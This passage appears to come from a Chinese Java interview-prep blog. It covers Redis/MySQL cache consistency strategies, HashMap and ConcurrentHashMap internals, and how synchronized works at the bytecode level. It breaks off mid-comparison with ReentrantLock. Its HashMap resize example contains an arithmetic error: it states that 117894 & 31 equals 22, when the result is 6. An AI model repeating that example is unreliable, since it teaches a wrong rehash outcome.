<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户 A 发起修改请求 <span class="string">``</span>服务先更新 MySQL：<span class="literal">user</span>.<span class="keyword">name</span> = <span class="string">&#x27;Jerry&#x27;</span> <span class="string">``</span>再删除 Redis 缓存中的旧值（<span class="literal">user</span>:<span class="number">123</span>:<span class="keyword">name</span> = <span class="string">&quot;Tom&quot;</span>） </span><br><span class="line">但这中间： <span class="string">``</span>→ 用户 B 发起读取请求 <span class="string">``</span>→ Redis 里还存在旧值 <span class="string">&quot;Tom&quot;</span> <span class="string">``</span>→ B 拿到了错误的昵称</span><br></pre></td></tr></table></figure>
<h2 id="✅-三大解决方案（核心）">✅ 三大解决方案（核心）</h2>
<h3 id="✅-方案一：延迟双删（经典方案）">✅ 方案一：<strong>延迟双删</strong>（经典方案）</h3>
<h4 id="✅-方案原理：">✅ 方案原理：</h4>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. 先删 Redis ``<span class="number">2</span>. 更新 MySQL ``<span class="number">3</span>. 延迟 <span class="number">500</span>ms 再删一次 Redis（防止并发读写）</span><br></pre></td></tr></table></figure>
<h4 id="✅-伪代码：">✅ 伪代码：</h4>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deleteRedis(<span class="string">&quot;user:123:name&quot;</span>); <span class="regexp">//</span> 第一次删除<span class="string">` `</span>updateMySQL(<span class="string">&quot;UPDATE user SET name=&#x27;Jerry&#x27; WHERE id=123&quot;</span>); <span class="string">``</span><span class="title class_">Thread</span>.sleep(<span class="number">500</span>); <span class="regexp">//</span> 等潜在的并发请求处理完<span class="string">` `</span>deleteRedis(<span class="string">&quot;user:123:name&quot;</span>); <span class="regexp">//</span> 再次删除脏数据</span><br></pre></td></tr></table></figure>
<h4 id="✅-举例解释：">✅ 举例解释：</h4>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">T1</span>：A 删除缓存 <span class="string">&quot;Tom&quot;</span> ``<span class="built_in">T2</span>：A 更新 MySQL → name = <span class="string">&quot;Jerry&quot;</span> ``<span class="built_in">T3</span>：<span class="keyword">B </span>发起请求，缓存为空 → 从 MySQL 读到 <span class="string">&quot;Jerry&quot;</span> → 回写 Redis ``<span class="built_in">T4</span>：A 延迟 <span class="number">500</span>ms 删除缓存 → 删除刚写回的脏数据 ``<span class="built_in">T5</span>：<span class="keyword">B </span>再次读到空缓存 → 再从 DB 读取最新值 <span class="string">&quot;Jerry&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="✅-面试答法模板：">✅ 面试答法模板：</h4>
<blockquote>
<p>我们可以采用延迟双删的方式解决一致性问题，即在更新数据库前删除一次 Redis，更新后延迟一段时间再次删除，避免并发读写导致的脏数据写回。</p>
</blockquote>
<h3 id="✅-方案二：引入消息队列清缓存（推荐）">✅ 方案二：<strong>引入消息队列清缓存（推荐）</strong></h3>
<h4 id="✅-方案原理：-2">✅ 方案原理：</h4>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. 更新数据库成功后 ``<span class="number">2</span>. 向 RocketMQ 或 Kafka 发一条删除缓存的消息 ``<span class="number">3</span>. 消费端异步消费消息后，删除缓存</span><br></pre></td></tr></table></figure>
<h4 id="✅-举例代码：">✅ 举例代码：</h4>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 生产者<span class="string">` `</span>updateMySQL(...); <span class="string">``</span>sendMQ(<span class="string">&quot;cache-delete-topic&quot;</span>, <span class="string">&quot;user:123:name&quot;</span>); <span class="string">` `</span>// 消费者监听<span class="string">` `</span>onMessage(key) &#123; <span class="string">``</span>   deleteRedis(key); <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h4 id="✅-举例流程：">✅ 举例流程：</h4>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">T1</span>：A 修改昵称，更新 MySQL ``<span class="built_in">T2</span>：A 发消息给 MQ，标记 user:<span class="number">123</span>:name 应被删除 ``<span class="built_in">T3</span>：并发的 <span class="keyword">B </span>请求 Redis，命中旧值，读到 <span class="string">&quot;Tom&quot;</span> ``<span class="built_in">T4</span>：消费者监听 MQ 消息，删除缓存 ``<span class="built_in">T5</span>：后续读请求都会从 DB 重新加载 <span class="string">&quot;Jerry&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="✅-面试答法模板：-2">✅ 面试答法模板：</h4>
<blockquote>
<p>数据更新成功后，发送消息到 MQ 异步删除 Redis，可以 decouple 清缓存逻辑，提升系统容错性。即使某个步骤失败，也可通过消息重试保证最终一致性。</p>
</blockquote>
<h3 id="✅-方案三：分布式锁控制读写顺序（适用于写多读多）">✅ 方案三：<strong>分布式锁控制读写顺序（适用于写多读多）</strong></h3>
<h4 id="✅-方案原理：-3">✅ 方案原理：</h4>
<blockquote>
<p>给写请求加 Redis 分布式锁，避免更新时有并发读写，强制串行化操作。</p>
</blockquote>
<h4 id="✅-举例代码：-2">✅ 举例代码：</h4>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tryLock(<span class="string">&quot;user:123:lock&quot;</span>)) &#123;<span class="keyword">try</span> &#123; <span class="string">``</span>      updateMySQL(...); <span class="string">``</span>      deleteRedis(...); <span class="string">``</span>   &#125; <span class="keyword">finally</span> &#123; <span class="string">``</span>      unlock(<span class="string">&quot;user:123:lock&quot;</span>); <span class="string">``</span>   &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h4 id="✅-举例流程：-2">✅ 举例流程：</h4>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">T1</span>：A 获取锁，准备修改昵称 ``<span class="built_in">T2</span>：<span class="keyword">B </span>请求读昵称，但因为未获取到锁，等待或失败 ``<span class="built_in">T3</span>：A 完成更新 + 删除缓存，释放锁 ``<span class="built_in">T4</span>：<span class="keyword">B </span>获取锁后再读，Redis 无数据 → 从 DB 加载最新值</span><br></pre></td></tr></table></figure>
<h4 id="✅-面试答法模板：-3">✅ 面试答法模板：</h4>
<blockquote>
<p>对热点 Key 使用分布式锁控制并发操作，是一种强一致性方式，适合并发量高、数据一致性要求严格的场景，但会带来一定的性能开销。</p>
</blockquote>
<h2 id="📌-统一面试回答总结模板">📌 统一面试回答总结模板</h2>
<blockquote>
<p>Redis 与 MySQL 搭配使用时，为了保证缓存与数据库的一致性，常用以下三种方案：</p>
<ol>
<li>延迟双删：删除两次 Redis，避免并发读写导致旧数据回写；</li>
<li>消息队列异步清缓存：更新数据库后发送 MQ 消息，让异步消费者删除缓存，解耦读写流程；</li>
<li>分布式锁：热点数据加锁，串行控制并发操作，适用于高一致性要求场景。</li>
</ol>
<p>这三种方案各有利弊，需要根据系统的一致性要求和性能需求选择。</p>
</blockquote>
<h2 id="HashMap的原理">HashMap的原理</h2>
<h3 id="1-HashMap-原理"><strong>1.HashMap 原理</strong></h3>
<ul>
<li><strong>结构</strong>：数组 + 链表 + 红黑树（JDK 1.8 后）</li>
<li><strong>哈希冲突</strong>：链地址法（链表或红黑树）</li>
<li><strong>扩容机制</strong>：负载因子默认 0.75，容量是 2 的幂次方，超过阈值则 resize（rehash）</li>
</ul>
<p><strong>例子</strong>：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; <span class="built_in">map</span> = <span class="literal">new</span> HashMap&lt;&gt;(); <span class="string">``</span><span class="built_in">map</span>.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>底层通过 <code>hash(key)</code> 计算 index，将键值对放入对应槽位。</p>
<p><strong>面试话术</strong>：</p>
<blockquote>
<p>HashMap 底层采用数组+链表/红黑树结构，JDK1.8 为了解决链表查找慢的问题，在链表长度超过 8 且数组容量大于 64 时转换为红黑树。其核心是通过 <code>hash(key)</code> 计算 index，然后进行存储。扩容时会重新计算 index（rehash）。</p>
</blockquote>
<p>HashMap 的扩容机制（以 JDK1.8 为例）</p>
<h2 id="🧠-一、扩容的触发条件">🧠 一、扩容的触发条件</h2>
<p>HashMap 默认容量为 16，负载因子为 0.75，<strong>当元素数量超过 16 × 0.75 = 12 时会触发扩容</strong>。</p>
<ul>
<li>每次扩容：<strong>容量翻倍</strong></li>
<li>举例：容量从 16 ➝ 32 ➝ 64 …</li>
</ul>
<h2 id="🔁-二、扩容的核心流程（resize）">🔁 二、扩容的核心流程（resize）</h2>
<p>当触发扩容时，会执行 <code>resize()</code> 方法，主要步骤如下：</p>
<h3 id="1-容量翻倍">1. <strong>容量翻倍</strong></h3>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">newCapacity</span> <span class="operator">=</span> oldCapacity &lt;&lt; <span class="number">1</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-创建新数组">2. <strong>创建新数组</strong></h3>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Node</span><span class="title">&lt;K</span>, V&gt;[] newTable = new <span class="keyword">Node</span><span class="title">[newCapacity</span>];</span><br></pre></td></tr></table></figure>
<h3 id="3-重新计算每个节点的位置（rehash）">3. <strong>重新计算每个节点的位置（rehash）</strong></h3>
<p>每个旧桶中的元素需要重新映射到新数组中新的位置。</p>
<ul>
<li>由于扩容是 2 的倍数，hash &amp; (newCap - 1) 和 hash &amp; oldCap 只差一个高位</li>
<li>所以旧节点位置只会：
<ul>
<li><strong>留在原位置</strong> 或</li>
<li><strong>移动到原位置 + oldCap</strong></li>
</ul>
</li>
</ul>
<h3 id="✅-举个例子-2">✅ 举个例子</h3>
<p>原数组容量是 16，有一个节点 <code>key = &quot;name&quot;</code>，hash 值为 <code>117894</code>，落在 index = 6。</p>
<p>扩容后数组长度变为 32，新的 index：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hash</span> &amp; (<span class="number">32</span> - <span class="number">1</span>) = <span class="number">117894</span> &amp; <span class="number">31</span> = <span class="number">22</span></span><br></pre></td></tr></table></figure>
<p>而原来的：</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">117894 </span>&amp; <span class="number">15</span> = <span class="number">6</span></span><br></pre></td></tr></table></figure>
<p>对比：</p>
<ul>
<li>是否要移动这个节点，只与 <code>hash &amp; oldCap</code> 是否为 0 有关。</li>
<li>如果为 0：<strong>留在原位置</strong></li>
<li>如果不为 0：<strong>移动到原 index + oldCap</strong></li>
</ul>
<h2 id="ConcurrentHashMap-原理"><strong>ConcurrentHashMap 原理</strong></h2>
<h3 id="ConcurrentHashMap-原理-2"><strong>ConcurrentHashMap 原理</strong></h3>
<ul>
<li>JDK 1.7：Segment 锁分段机制</li>
<li>JDK 1.8：CAS + synchronized 控制每个链表/树节点的并发写</li>
</ul>
<p><strong>例子</strong>：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; <span class="built_in">map</span> = <span class="literal">new</span> ConcurrentHashMap&lt;&gt;(); <span class="string">``</span><span class="built_in">map</span>.put(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>面试话术</strong>：</p>
<blockquote>
<p>ConcurrentHashMap 在 JDK 1.8 使用 CAS 和 synchronized 替代了原来的 Segment 锁分段机制，提高了并发度。插入时通过 CAS 插入头结点，冲突则加锁链表/红黑树，读操作无锁，保证了线程安全和性能。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk0NDZjMzM3N2MxNTBkZTQ4NjRmOTY3MzBhY2Q5MWFfdEp3eXRRZnVFaVp1MmZqSUIwWUlNMkg5MDZhd1VpT1FfVG9rZW46UlpiQ2J6Qjgwb1o5WXN4NDZFSmNET0tTbkRlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧮-三、JDK1-8-底层结构详解（面试主考点）">🧮 三、JDK1.8 底层结构详解（面试主考点）</h2>
<ol>
<li>
<h2 id="主体结构">主体结构</h2>
</li>
</ol>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient volatile <span class="keyword">Node</span><span class="title">&lt;K</span>,V&gt;[] table;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Node[]</code> 是主结构，类似于 HashMap 的数组</li>
<li>每个槽位可能是链表或红黑树（当链表长度超过 8）</li>
<li>支持并发扩容</li>
</ul>
<ol>
<li>
<h2 id="核心机制解析">核心机制解析</h2>
</li>
</ol>
<h4 id="✅-2-1-put-流程（写流程）">✅ 2.1 put() 流程（写流程）</h4>
<p>以 <code>map.put(&quot;name&quot;, &quot;Tom&quot;)</code> 为例，流程如下：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）根据 key 计算 hash` `2）定位数组位置 table[index]` `3）如果 table[index] == null，用 CAS 创建新的节点` `4）如果该位置有值，使用 synchronized 锁住该桶头节点 ``    - 如果是链表，则遍历判断是否更新 key 或尾插 ``    - 如果是红黑树，使用红黑树方式插入` `5）插入后检查是否需要树化或扩容</span><br></pre></td></tr></table></figure>
<p>🔒 关键点：</p>
<ul>
<li>首次插入使用 <strong>CAS + 自旋</strong></li>
<li>冲突处理使用 <strong>synchronized 锁定某个桶的头节点</strong>，不是整个 map</li>
<li>大大减少锁粒度，提升并发能力</li>
</ul>
<h4 id="✅-2-2-get-流程（读流程）">✅ 2.2 get() 流程（读流程）</h4>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）根据 key 计算 <span class="built_in">hash</span><span class="string">` `</span><span class="number">2</span>）定位 table[index] <span class="string">``</span><span class="number">3</span>）遍历链表/红黑树找到值</span><br></pre></td></tr></table></figure>
<p>⚠️ get() 是无锁的，依赖 <code>volatile</code> 保证可见性和有序性。</p>
<h4 id="✅-2-3-扩容机制（resize）">✅ 2.3 扩容机制（resize）</h4>
<p>与 HashMap 类似，但是多线程协作进行扩容，采用 <strong><code>transferIndex</code></strong> <strong>分段扩容机制</strong>。</p>
<ul>
<li>多个线程共同迁移旧数据到新表</li>
<li>每次一个线程只负责一部分桶（batch size）</li>
<li>避免全表加锁，提高扩容效率</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmYzYzg1OGI5ZTU5NmFkZDBmZWY5MDRmMGIyYjMwODdfbXpMcHhOa2dDS1Q2enVpOE1GeTY1RzdQWUxIQTVjdlZfVG9rZW46Qjl2UmJLejlub3pPT3p4T0w4c2NibHU1bmNnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧪-五、常见面试问题示例">🧪 五、常见面试问题示例</h2>
<h3 id="Q1：ConcurrentHashMap-为什么线程安全？">Q1：ConcurrentHashMap 为什么线程安全？</h3>
<blockquote>
<p>因为它使用了 CAS + synchronized 实现细粒度锁定，只锁住每个桶的头节点；同时读操作是无锁的，依赖 volatile 保证可见性。</p>
</blockquote>
<h3 id="Q2：为什么用-synchronized-而不是-ReentrantLock？">Q2：为什么用 synchronized 而不是 ReentrantLock？</h3>
<blockquote>
<p>JDK1.8 对 synchronized 优化较多（如偏向锁、轻量级锁），性能足够；且不需要显式释放锁，代码更简洁。</p>
</blockquote>
<h3 id="Q3：ConcurrentHashMap-为什么使用-CAS？">Q3：ConcurrentHashMap 为什么使用 CAS？</h3>
<blockquote>
<p>CAS 可以在无锁的前提下进行原子操作，避免了多线程竞争对全表加锁，提高并发性能。</p>
</blockquote>
<h2 id="🎯-面试话术总结（记住这段即可）">🎯 面试话术总结（记住这段即可）</h2>
<blockquote>
<p>在 JDK1.8 中，ConcurrentHashMap 使用了数组 + 链表 + 红黑树的结构。通过 CAS + synchronized 的方式实现线程安全。读操作无锁，写操作只锁定桶的头节点，极大减少锁粒度。在扩容时通过多个线程协作迁移数据，实现高并发性能。相比 HashMap，ConcurrentHashMap 能安全高效地应对多线程环境。</p>
</blockquote>
<h2 id="✅-一、ConcurrentHashMap-线程安全体现在哪？">✅ 一、ConcurrentHashMap 线程安全体现在哪？</h2>
<h3 id="🌟-关键体现：">🌟 关键体现：</h3>
<ol>
<li><strong>写操作（put/remove）加锁控制：</strong>
<ol>
<li><code>JDK1.7</code>：使用 <code>Segment</code> 分段锁（每个 Segment 是一个 ReentrantLock）</li>
<li><code>JDK1.8</code>：使用 <code>synchronized</code> 只锁桶头节点，非全表锁</li>
</ol>
</li>
<li><strong>读操作（get）是无锁的：</strong>
<ol>
<li>依赖 <code>volatile</code> 关键字保证可见性</li>
<li>多线程读无阻塞</li>
</ol>
</li>
<li><strong>扩容机制支持多线程协作：</strong>
<ol>
<li>使用 <code>transferIndex</code> 按分段迁移旧数据，避免阻塞</li>
</ol>
</li>
</ol>
<h2 id="❌-二、HashMap-在线程不安全方面的体现？">❌ 二、HashMap 在线程不安全方面的体现？</h2>
<h3 id="❗-主要问题：">❗ 主要问题：</h3>
<ol>
<li><strong>并发 put 会造成数据丢失或覆盖：</strong>
<ol>
<li>多线程同时写入，可能覆盖彼此数据</li>
</ol>
</li>
<li><strong>并发扩容会导致死循环（链表成环）：</strong>
<ol>
<li>扩容时链表迁移顺序不一致，可能导致链表闭环，形成死循环</li>
<li>会导致 CPU 飙高，线程阻塞</li>
</ol>
</li>
</ol>
<h2 id="🧪-三、示例对比（多线程并发写）">🧪 三、示例对比（多线程并发写）</h2>
<h3 id="🚨-HashMap-示例（线程不安全）">🚨 HashMap 示例（线程不安全）</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; <span class="built_in">map</span> = <span class="literal">new</span> HashMap&lt;&gt;(); <span class="string">` `</span>Runnable task = () -&gt; &#123;for (int i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123; <span class="string">``</span>        <span class="built_in">map</span>.put(<span class="keyword">Thread</span>.currentThread().getName() + i, <span class="string">&quot;value&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;; <span class="string">` `</span><span class="keyword">Thread</span> t1 = <span class="literal">new</span> <span class="keyword">Thread</span>(task);<span class="string">` `</span><span class="keyword">Thread</span> t2 = <span class="literal">new</span> <span class="keyword">Thread</span>(task); <span class="string">``</span>t1.start(); <span class="string">``</span>t2.start(); <span class="string">``</span>t1.<span class="keyword">join</span>(); <span class="string">``</span>t2.<span class="keyword">join</span>(); <span class="string">``</span>System.out.println(<span class="built_in">map</span>.size()); <span class="comment">// 可能 &lt; 2000，说明丢数据了</span></span><br></pre></td></tr></table></figure>
<h3 id="✅-ConcurrentHashMap-示例（线程安全）">✅ ConcurrentHashMap 示例（线程安全）</h3>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; <span class="built_in">map</span> = <span class="literal">new</span> ConcurrentHashMap&lt;&gt;(); <span class="string">` `</span>Runnable task = () -&gt; &#123;for (int i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123; <span class="string">``</span>        <span class="built_in">map</span>.put(<span class="keyword">Thread</span>.currentThread().getName() + i, <span class="string">&quot;value&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;; <span class="string">` `</span><span class="keyword">Thread</span> t1 = <span class="literal">new</span> <span class="keyword">Thread</span>(task);<span class="string">` `</span><span class="keyword">Thread</span> t2 = <span class="literal">new</span> <span class="keyword">Thread</span>(task); <span class="string">``</span>t1.start(); <span class="string">``</span>t2.start(); <span class="string">``</span>t1.<span class="keyword">join</span>(); <span class="string">``</span>t2.<span class="keyword">join</span>(); <span class="string">``</span>System.out.println(<span class="built_in">map</span>.size()); <span class="comment">// 一定等于 2000</span></span><br></pre></td></tr></table></figure>
<h2 id="✅-三、对比总结（面试回答模板）">✅ 三、对比总结（面试回答模板）</h2>
<blockquote>
<p>HashMap 在线程并发写入时没有任何同步措施，容易出现死循环、数据覆盖、数据丢失等问题。而 ConcurrentHashMap 则通过 CAS 和 synchronized 锁定每个桶头节点，实现细粒度加锁，同时读操作无锁并依赖 volatile 保证可见性，从而实现线程安全。特别是在扩容和高并发写入场景下，性能和安全性远高于 HashMap。</p>
</blockquote>
<h2 id="synchronized关键字在字节码层面的原理">synchronized关键字在字节码层面的原理</h2>
<h2 id="💡-一、什么是-synchronized？">💡 一、什么是 synchronized？</h2>
<p><code>synchronized</code> 是 Java 提供的一种 <strong>同步机制</strong>，可以让多个线程在访问共享资源时<strong>串行化执行</strong>，从而避免线程安全问题。</p>
<p>使用方式有三种：</p>
<ol>
<li><code>synchronized(obj) &#123;&#125;</code> 代码块</li>
<li><code>synchronized</code> 修饰方法（实例方法）</li>
<li><code>synchronized</code> 修饰静态方法</li>
</ol>
<h2 id="🧪-二、简单例子看懂-synchronized">🧪 二、简单例子看懂 synchronized</h2>
<p>来看个简单的 Java 类：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> SyncExample &#123;<span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> instanceMethod() &#123; <span class="string">``</span>        System.<span class="keyword">out</span>.println(<span class="string">&quot;实例方法&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> staticMethod() &#123; <span class="string">``</span>        System.<span class="keyword">out</span>.println(<span class="string">&quot;静态方法&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span><span class="keyword">public</span> <span class="keyword">void</span> blockMethod() &#123;<span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123; <span class="string">``</span>            System.<span class="keyword">out</span>.println(<span class="string">&quot;代码块&quot;</span>); <span class="string">``</span>        &#125; <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="🔬-三、synchronized-在字节码层面是怎么工作的？">🔬 三、synchronized 在字节码层面是怎么工作的？</h2>
<h3 id="👉-使用-javap-v-c-命令可以看到编译后的字节码（我们重点看-blockMethod）：">👉 使用 <code>javap -v -c</code> 命令可以看到编译后的字节码（我们重点看 blockMethod）：</h3>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">public void blockMethod(); ``  Code</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">0</span><span class="punctuation">:</span> <span class="string">aload_0</span></span><br><span class="line">    <span class="attribute">1</span><span class="punctuation">:</span> <span class="string">dup</span></span><br><span class="line">    <span class="attribute">``2</span><span class="punctuation">:</span> <span class="string">monitorenter</span></span><br><span class="line">    <span class="attribute">3</span><span class="punctuation">:</span> <span class="string">getstatic     #2 // Field java/lang/System.out:Ljava/io/PrintStream; ``    6: ldc           #3 // String 代码块 ``    8: invokevirtual #4 // Method java/io/PrintStream.println:(Ljava/lang/String;)V ``    11: monitorexit</span></span><br><span class="line">    <span class="attribute">12</span><span class="punctuation">:</span> <span class="string">goto          20 ``    15: astore_1</span></span><br><span class="line">    <span class="attribute">``16</span><span class="punctuation">:</span> <span class="string">monitorexit</span></span><br><span class="line">    <span class="attribute">17</span><span class="punctuation">:</span> <span class="string">aload_1</span></span><br><span class="line">    <span class="attribute">18</span><span class="punctuation">:</span> <span class="string">athrow</span></span><br><span class="line">    <span class="attribute">20</span><span class="punctuation">:</span> <span class="string">return</span></span><br></pre></td></tr></table></figure>
<h3 id="🧠-解读：">🧠 解读：</h3>
<ul>
<li><strong><code>monitorenter</code>****：进入同步块（加锁）</strong></li>
<li><strong><code>monitorexit</code>****：退出同步块（释放锁）</strong></li>
<li>JVM 在遇到 <code>monitorenter</code> 时，会尝试获取当前对象的监视器锁（monitor）。</li>
<li>如果锁被其他线程占用，当前线程会阻塞直到获得锁。</li>
</ul>
<h2 id="🏛️-四、Monitor（监视器锁）是什么？">🏛️ 四、Monitor（监视器锁）是什么？</h2>
<p>你可以理解为 JVM 中的一个 <strong>锁对象控制器</strong>。</p>
<p>每个 Java 对象（Object）都有一个 <strong>对象头</strong>，里面包含了一块区域叫 <strong>Mark Word</strong>，存储了线程 ID、锁状态、偏向锁标志、哈希值等。</p>
<p>当执行 <code>synchronized(obj)</code> 时，JVM 会使用 <code>obj</code> 的对象头 + Monitor 来实现锁定行为。</p>
<h2 id="🧵-六、线程是怎么获得锁的？底层流程：">🧵 六、线程是怎么获得锁的？底层流程：</h2>
<p>Java 的锁并不是一开始就用“重量级”锁，而是根据竞争情况进行优化，主要有：</p>
<h3 id="锁的状态变化过程：">锁的状态变化过程：</h3>
<ol>
<li><strong>无锁状态</strong>：对象没人竞争，执行快。</li>
<li><strong>偏向锁</strong>：对象只被一个线程访问，避免加锁操作，最快。</li>
<li><strong>轻量级锁</strong>：多个线程尝试加锁，用 CAS 自旋避免阻塞。</li>
<li><strong>重量级锁（Monitor）</strong>：竞争严重时，进入阻塞挂起，用操作系统互斥量。</li>
</ol>
<h3 id="对象头变化：">对象头变化：</h3>
<ul>
<li><code>Mark Word（对象头）内容示意： ``无锁状态       -&gt; 线程 ID 为 0 ``偏向锁         -&gt; 写入当前线程 ID ``轻量级锁       -&gt; 指向 Lock Record（线程栈里的结构） ``重量级锁       -&gt; 指向 Monitor 的地址</code></li>
</ul>
<h2 id="👨💻-七、面试这样说（话术总结）：">👨💻 七、面试这样说（话术总结）：</h2>
<blockquote>
<p>synchronized 在字节码中对应 <code>monitorenter</code> 和 <code>monitorexit</code> 指令，它通过对象头中的 Mark Word 搭配 JVM 内部的 Monitor 实现锁机制。它支持三种使用方式：代码块、实例方法和静态方法，对应不同的加锁对象。底层锁的实现是分层的，有偏向锁、轻量级锁和重量级锁，JVM 会根据竞争情况进行优化。方法上的 synchronized 会直接通过 ACC_SYNCHRONIZED 标志位被 JVM 自动处理。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGUwM2EwMGNiNWUxYmZhZTNiOGVlYTgyOWVjNzE3ZTFfOWdJdmRCb0F3ZTZvRVJ4OHJDQTVBV1dtQlQyS3BlZGRfVG9rZW46WEw1TWJjS3Rtb0t0MzV4NGVLdGNtTmU5bk9lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="synchronized和reentrantlock的区别">synchronized和reentrantlock的区别</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjBiNWU3YzZjZWE4ODcxYzdkOTQwZDAyMGU4MGJiYmZfTG5taVFKQklqNlhiVWl0eTE3M241OWVWMnhsUFJWSG9fVG9rZW46SkxnMmJ2aVJYbzhVdFp4ZGhrMWNQOFBPbnplXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-二、详细区别讲解（结合面试答题）">✅ 二、详细区别讲解（结合面试答题）</h2>
<h3 id="1-原理不同（字节码-vs-API）">1. <strong>原理不同（字节码 vs API）</strong></h3>
<ul>
<li><code>synchronized</code> 属于 JVM 层面支持，在编译期会生成 <code>monitorenter</code> 和 <code>monitorexit</code> 字节码指令</li>
<li><code>ReentrantLock</code> 属于 Java API，依赖 AQS（AbstractQueuedSynchronizer）实现，灵活度更高</li>
</ul>
<h3 id="2-是否可中断-超时">2. <strong>是否可中断/超时</strong></h3>
<ul>
<li><code>synchronized</code>：不可中断、不可超时，容易死锁</li>
<li><code>ReentrantLock</code>：
